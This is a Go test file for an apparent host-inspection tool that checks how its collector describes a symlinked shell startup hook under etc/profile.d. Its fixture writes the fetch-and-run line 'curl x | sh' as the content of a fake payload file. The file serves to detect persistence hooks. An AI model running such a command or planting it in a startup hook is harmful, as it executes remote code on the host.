package system

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/cpibia/tripwatch/internal/collector"
)

// A hook that is a link takes the later of its own change time and its target's, and says
// where it leads: a link made now to a file written long ago is not an old hook.
func TestHookLinkChangeTime(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "etc/profile.d"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "etc/payload"), []byte("curl x | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	target, err := os.Stat(filepath.Join(root, "etc/payload"))
	if err != nil {
		t.Fatal(err)
	}
	targetChange, _ := collector.ChangeTime(target)
	time.Sleep(20 * time.Millisecond)
	if err := os.Symlink("../payload", filepath.Join(root, "etc/profile.d/z.sh")); err != nil {
		t.Fatal(err)
	}
	out, err := Hooks{}.Collect(context.Background(), collector.NewSource(root))
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range out.(HooksResult).Files {
		if f.Path != "/etc/profile.d/z.sh" {
			continue
		}
		if f.Link != "../payload" || !f.ChangeTime.After(time.Unix(0, targetChange)) {
			t.Errorf("link %q, change time %v, target's %v", f.Link, f.ChangeTime, time.Unix(0, targetChange))
		}
		return
	}
	t.Fatal("the linked hook was not described")
}
